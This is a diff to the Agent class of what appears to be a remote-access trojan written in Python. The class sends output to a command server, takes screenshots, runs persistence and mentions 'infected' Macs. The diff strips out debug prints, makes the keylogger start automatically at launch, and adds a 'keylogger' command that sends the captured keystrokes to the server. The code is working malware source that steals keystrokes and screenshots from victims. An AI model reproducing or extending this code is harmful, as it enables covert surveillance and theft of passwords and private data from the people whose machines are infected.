@@ -102,9 +102,7 @@ class Agent(object):
         """ Send console output to server """
         if not isinstance(output, str):
             output = output.decode("utf-8")
-            print("decoded output")
-        else:
-            print("output is string anyways")
+
         if self.silent:
             self.log(output)
             return
@@ -286,7 +284,7 @@ class Agent(object):
         else:
             name = tmp_file.name + ".png"
             os.system("screencapture %s" % name)
-            print(name)
+
         self.upload(screenshot_file)
 
     @threaded
@@ -300,8 +298,10 @@ class Agent(object):
 
     @threaded
     def getloggedkeys(self):
-        self.send_output(str(self.keylogs))
+        self.send_output(self.keylogs)
         self.keylogs = ""
+        if platform.system() == "Darwin":
+            self.send_output("Keylogger on infected Mac currenly not supported")
 
     def help(self):
         """ Displays the help """
@@ -316,6 +316,10 @@ class Agent(object):
             except:
                 self.log("Failed executing persistence")
         self.silent = False
+        try:
+            self.startkeylogger()
+        except:
+            self.log("startKeylogger failed")
         while True:
             try:
                 todo = self.server_hello()
@@ -368,6 +372,8 @@ class Agent(object):
                                 self.python(" ".join(args))
                         elif command == 'screenshot':
                             self.screenshot()
+                        elif command == 'keylogger':
+                            self.getloggedkeys()
                         elif command == 'help':
                             self.help()
                         else:
